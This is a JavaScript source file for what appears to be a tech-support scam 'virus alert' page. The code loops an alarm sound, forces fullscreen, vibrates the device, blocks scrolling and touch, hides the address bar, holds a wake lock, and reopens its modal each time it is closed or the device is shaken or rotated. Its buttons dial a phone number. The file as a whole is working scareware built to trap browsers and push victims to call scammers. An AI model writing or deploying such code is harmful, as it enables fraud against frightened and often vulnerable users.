$(document).ready(() => {
  // Function to start the countdown timer
  function startCountdown() {
    let timeInSeconds = 5 * 60; // 5 minutes in seconds

    const countdown = setInterval(() => {
      let minutes = Math.floor(timeInSeconds / 60);
      let seconds = timeInSeconds % 60;

      // Format minutes and seconds to always show 2 digits
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      // Update the timer display
      document.getElementById("countdown-timer").innerText = `${minutes}:${seconds}`;

      // Decrease time by 1 second
      timeInSeconds--;

      // When the countdown reaches 0, restart the timer
      if (timeInSeconds < 0) {
        clearInterval(countdown);
        startCountdown(); // Restart the countdown
      }
    }, 1000);
  }

  // Start the countdown
  startCountdown();

  const virusModal = document.getElementById("virusModal");
  const modalInstance = new bootstrap.Modal(virusModal);
  const audioPlayer = $("#audioPlayer")[0];

  audioPlayer.play();

  audioPlayer.addEventListener("ended", () => {
    audioPlayer.play();
  });

  // Function to go fullscreen
  function goFullScreenAndVibrate() {
    const element = document.documentElement; // Use the whole document for fullscreen

    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if (element.mozRequestFullScreen) {
      // Firefox
      element.mozRequestFullScreen();
    } else if (element.webkitRequestFullscreen) {
      // Chrome, Safari, and Opera
      element.webkitRequestFullscreen();
    } else if (element.msRequestFullscreen) {
      // IE/Edge
      element.msRequestFullscreen();
    }

    navigator.vibrate([200, 100, 200]); // Custom vibration pattern
    modalInstance.show(); // Show the modal
  }

  // Prevent scrolling and user interactions to simulate a blocked ad
  function disableUserInteractions() {
    $("body").css({
      overflow: "hidden",
      position: "fixed",
      touchAction: "none",
    });
  }

  disableUserInteractions();

  // Function to hide the browser's navigation bar
  function hideBrowserNavBar() {
    // Ensure body is full-height, so page will stretch to the bottom
    $("body, html").css({
      height: "100%",
      margin: "0",
    });

    // Use the viewport to hide the browser's address bar
    setTimeout(() => {
      window.scrollTo(0, 1); // Scroll slightly to hide the address bar
    }, 500);
  }

  // Force fullscreen after user interaction (touch or click)
  function userInteractionHandler() {
    goFullScreenAndVibrate();
    hideBrowserNavBar();
    playAudioLoop();
    window.removeEventListener("touchstart", userInteractionHandler);
    window.removeEventListener("click", userInteractionHandler);
  }

  window.addEventListener("touchstart", userInteractionHandler);
  window.addEventListener("click", userInteractionHandler);

  // Handle modal behavior
  if (virusModal) {
    virusModal.addEventListener("hidden.bs.modal", () => {
      setTimeout(() => {
        modalInstance.show();
        goFullScreenAndVibrate();
      }, 300); // 0.3 second delay
    });
  }

  // Handle button clicks to initiate phone calls
  $("#callButton, #callButton1, #callButton2").on("click", () => {
    window.location.href = "tel:+18778381219";
  });

  // Detect device shake using the DeviceMotion API
  window.addEventListener("devicemotion", (event) => {
    const acceleration = event.accelerationIncludingGravity;
    if (acceleration.x > 15 || acceleration.y > 15 || acceleration.z > 15) {
      goFullScreenAndVibrate();
      alert("Device shake detected! Returning to the alert screen.");
    }
  });

  // Screen Wake Lock API to prevent screen sleep
  if ("wakeLock" in navigator) {
    navigator.wakeLock.request("screen").catch((err) => {
      console.error("Wake lock error:", err);
    });
  }

  // Handle screen orientation changes
  window.addEventListener("orientationchange", () => {
    alert("Screen rotated! Adjusting to maintain the alert.");
    goFullScreenAndVibrate();
  });
});
